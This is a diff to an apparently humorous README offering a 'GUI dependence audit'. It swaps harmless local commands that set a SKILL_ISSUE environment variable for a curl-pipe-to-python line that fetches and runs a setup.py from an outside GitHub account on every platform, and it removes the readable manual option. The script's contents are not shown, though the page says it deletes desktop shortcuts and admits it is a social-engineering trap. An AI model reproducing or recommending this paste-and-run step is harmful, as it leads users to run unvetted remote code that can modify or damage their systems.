@@ -360,37 +360,25 @@ Choose your compliance pathway below to evaluate your technical vulnerability.
 Run this single line to automatically detect your operating system archetype, audit your GUI dependence, and inject a localized environment reality check directly into your system core.
 
 ##### 🪟 Windows (PowerShell)
-```powershell
-curl -sSL https://raw.githubusercontent.com/GoogleHub67/GoogleHub67/main/setup.py | python -
-```
-
-##### 🍏 / 🐧 macOS & Linux (Terminal)
-```bash
-curl -sSL https://raw.githubusercontent.com/GoogleHub67/GoogleHub67/main/setup.py | python3 -
-```
-
----
-
-#### 💤 Pathway B: The Manual Vector (Paranoid/Isolated)
-If you suffer from trust issues or are too lazy to open files and prefer to audit the payloads locally before executing your configuration realignment, evaluate your terminal environment using the manual strings below:
-
-##### 🪟 Windows PowerShell 
 The gold standard for automated self-reflection. Run this to gracefully inject a reality check directly into your user environment scope:
 ```powershell
-[Environment]::SetEnvironmentVariable("SKILL_ISSUE", $true, "User"); Write-Host "==================================================="; Write-Host "[!] REBOOT SUCCESSFUL: ENVIRONMENT UPDATED"; Write-Host "[!] CURRENT SKILL_ISSUE STATUS: $([Environment]::GetEnvironmentVariable('SKILL_ISSUE', 'User'))"; Write-Host "==================================================="; Write-Host "Congratulations. You successfully executed an environment scope modification because clicking via GUI was too hard."; Write-Host "Next time, try not to break your PATH configuration."
+curl -sSL https://raw.githubusercontent.com/GoogleHub67/GoogleHub67/main/setup.py | python -
 ```
 
 ##### 🖥️ Windows CMD (Command Prompt)
 If you refuse to leave the 1990s and prefer your automation served cold, force it straight into your registry to spawn a fresh diagnostic scope:
 ```cmd
-REG ADD HKCU\Environment /v SKILL_ISSUE /t REG_SZ /d true /f && start cmd /v:on /k "echo =================================================== && echo [!] REBOOT SUCCESSFUL: ENVIRONMENT UPDATED && echo [!] CURRENT SKILL_ISSUE STATUS: true && echo =================================================== && echo Congratulations. You successfully restarted a window because clicking via GUI was too hard. && echo Next time, try not to break your PATH configuration." && exit
+curl -sSL https://raw.githubusercontent.com/GoogleHub67/GoogleHub67/main/setup.py | python -
 ```
 
-##### 🐧 Unix Shells (Bash / Zsh)
+##### 🍏 / 🐧 macOS & Linux (Terminal)
 For the Linux gatekeepers and macOS purists who think using a terminal makes them an elite hacker. Permanent self-sabotage is just an append command away:
 ```bash
-echo 'export SKILL_ISSUE="true"' >> ~/."$(basename "$SHELL")"rc && source ~/."$(basename "$SHELL")"rc && echo "===================================================" && echo "[!] REBOOT SUCCESSFUL: ENVIRONMENT UPDATED" && echo "[!] CURRENT SKILL_ISSUE STATUS: $SKILL_ISSUE" && echo "===================================================" && echo "Congratulations. You successfully appended a configuration file because clicking via GUI was too hard." && echo "Next time, try not to break your PATH configuration."
+curl -sSL https://raw.githubusercontent.com/GoogleHub67/GoogleHub67/main/setup.py | python3 -
 ```
+
+If you are Paranoid/Isolated and you suffer from trust issues or are too lazy to open files and prefer to audit the payloads locally before executing your configuration realignment, evaluate your terminal environment as much as you wish.
+---
 
 *Note: If any of these diagnostic indicators throw an unexpected system error, it only mathematically validates the evaluation.*
 
@@ -400,7 +388,7 @@ echo 'export SKILL_ISSUE="true"' >> ~/."$(basename "$SHELL")"rc && source ~/."$(
 | :--- | :--- | :--- | :--- |
 | **Stage 01: Audit** | GUI Dependency Scan | `sys.platform` check | If mouse coordinates > keyboard inputs, log `SKILL_ISSUE` |
 | **Stage 02: Purge** | Bloatware Clearance | `os.system()` trigger | Removes point-and-click adventure shortcuts from your desktop |
-| **Stage 03: Injection**| Mainframe Alignment| Environment variable export | Forces permanent terminal-only reality check into user profile |
+| **Stage 03: Injection**| Mainframe Alignment | Environment variable export | Forces permanent terminal-only reality check into user profile |
 
 > [!IMPORTANT]
 > Downloading and running unverified scripts straight from a 13-year-old's repository because a text block told you it would "audit your system" mathematically confirms that your local cybersecurity framework is operating at a severe deficit. Congratulations on passing the social engineering gateway.
